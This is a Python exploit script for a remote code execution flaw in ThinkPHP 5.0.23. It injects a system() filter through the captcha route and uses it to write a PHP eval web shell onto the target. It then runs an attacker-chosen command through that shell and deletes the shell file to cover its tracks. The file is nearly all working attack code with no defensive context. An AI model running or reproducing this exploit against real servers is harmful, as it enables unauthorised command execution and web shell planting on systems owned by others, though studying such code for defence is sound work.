"""  
@Time: 2024/2/29 10:46 
@Auth: Y5neKO
@File: Thinkphp5023_rce.py 
@IDE: PyCharm 
"""
import random

import requests


def run(url, cmd):
    try:
        random_id = random.randint(1000, 9999)
        target = url + '/index.php?s=captcha'
        payload = r'_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={}'.format('echo "<?php @eval($_POST[\'cmd\']); ?>" > {}.php'.format(random_id))
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        webshell_add = requests.post(target, data=payload, verify=False, headers=headers)

        target2 = url + '/{}.php'.format(random_id)
        payload2 = "cmd=echo '{{{{{';system('" + cmd + "');echo '}}}}}';"
        response = requests.post(target2, data=payload2, verify=False, headers=headers)

        payload3 = r'_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=del {}.php'.format(random_id)
        payload4 = r'_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=rm -f {}.php'.format(random_id)
        webshell_del = requests.post(target, data=payload3, verify=False, headers=headers)
        webshell_rm = requests.post(target, data=payload4, verify=False, headers=headers)

        if response.status_code == 200:
            return True, response.text
        else:
            return False, "利用失败"
    except:
        return False
